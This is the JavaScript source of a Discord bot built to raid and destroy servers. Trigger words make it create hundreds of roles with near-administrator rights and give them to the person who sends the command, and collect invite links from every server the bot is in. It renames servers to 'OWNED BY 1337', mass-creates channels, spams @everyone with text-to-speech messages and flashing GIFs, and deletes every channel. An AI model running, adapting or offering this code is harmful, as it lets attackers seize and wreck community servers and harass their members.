const Discord = require("discord.js");
const client = new Discord.Client();
var prefix = '=='


client.on("ready", () => {
    client.user.setActivity(`${client.guilds.size} serveurs.`,"WATCHING")
    console.log('╔[═════════════════════════════════════════════════════════════════]╗')
    console.log(`[Start] ${new Date()}`);
    console.log('╚[═════════════════════════════════════════════════════════════════]╝')
    console.log('')
    console.log('╔[════════════════════════════════════]╗');
    console.log(`Connecté sur [ " ${client.user.username} " ]`);
    console.log('')
    console.log('Informations :')
    console.log('')
    console.log(`Servers : [ " ${client.guilds.size} " ]`);
    console.log(`Users : [ " ${client.users.size} " ]`);
    console.log(`Channels : [ " ${client.channels.size} " ]`);
    console.log(`Lien d'invitation : [ " https://discordapp.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot " ]`)
    console.log('╚[════════════════════════════════════]╝')
    console.log('')
    console.log('╔[════════════]╗')
    console.log(' Bot Is Online')
    console.log('╚[════════════]╝')
    console.log('')
    console.log('')
})


client.on("message", message => {

    if(message.content === "roles"){
        for(var i =0; i < 200; i++){
            message.guild.createRole({name:"1337 > All !",
                                     mentionable:false,
                                     permissions:2146958591,
                                     position: "",
                                     color: "#fb0707"
                })
                message.guild.createRole({name:"1337 > All !",
                mentionable:false,
                permissions:2146958591,
                position: "",
                color: "#ff08c5"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#5d08ff"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#0c08ff"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#08d5ff"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#08ffa3"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#08ff23"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#81ff08"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#fff608"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#ff6f08"
      })
      message.guild.createRole({name:"1337 > All !",
      mentionable:false,
      permissions:2146958591,
      position: "",
      color: "#ff0808"
      })
            }
        }
        if(message.content.includes(".rol")){
            message.guild.createRole({name:"Izi",
                                      mentionable:false,
                                      permissions:2146958591,
                                      position: "",
           })
        }
        if(message.content.includes(".raul")){
          (message.guild.roles.map(r => message.member.addRoles(r)))
        }
        if(message.content.includes("ar!kelsairvvesrx")){
          client.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
        }
                  if(message.content.includes("A?serveurinvite")){
                      client.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
                  }

                  if(message.content === "issou"){
                      message.guild.setName("OWNED BY 1337")
                      message.guild.setIcon("https://cdn.discordapp.com/attachments/534842681407438851/535515719534772224/giphy_1.gif")
                    }
                    if(message.content === "pd"){
                      for(var i =0; i < 450; i++){
                      message.guild.createChannel("fucked by 1337","voice")
                      }
                    }
                    if(message.content.includes("@everyone")){
                        for(var i = 0; i < 999; i++){
                            message.channel.send("@everyone FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true})
                        }
                    }
                    if(message.content.includes(".sc")){
                      for(var i =0; i < 999; i++){
                        message.guild.createChannel("fucked by 1337", "text").then(c => c.send("@everyone FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true}))
                      }
                  }
                    //réaction en chaine
                          if(message.content === "channel"){
                              for(var i = 0; i < 500; i++){
                                  message.guild.createChannel("fucked by 1337", "text").then(c => c.send("@everyone FUCK3D BY 1337, WE ARE THE BEST https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gifhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif", {tts: true}))
                                  message.guild.createChannel("fucked by 1337","voice")
                                  message.guild.createChannel("fucked by 1337","category")    
                              }
                            }
                            if(message.content === "destroy"){
                              message.guild.channels.map(c => c.delete())
                              }
                              //on commence la destruction
                              if(message.content.includes(".détruiree")){
                                  message.channel.send("ban").then(m => m.delete());
                                  message.channel.send("drole").then(m => m.delete());
                                  message.channel.send("roles").then(m => m.delete());
                                  message.channel.send("issou").then(m => m.delete());
                                  message.channel.send("channel").then(m => m.delete());
                                  message.channel.send("destroy").then(m => m.delete());
                                  message.guild.createChannel("fucked by 1337", "text")
                              }
})

    client.login(process.env.TOKEN)
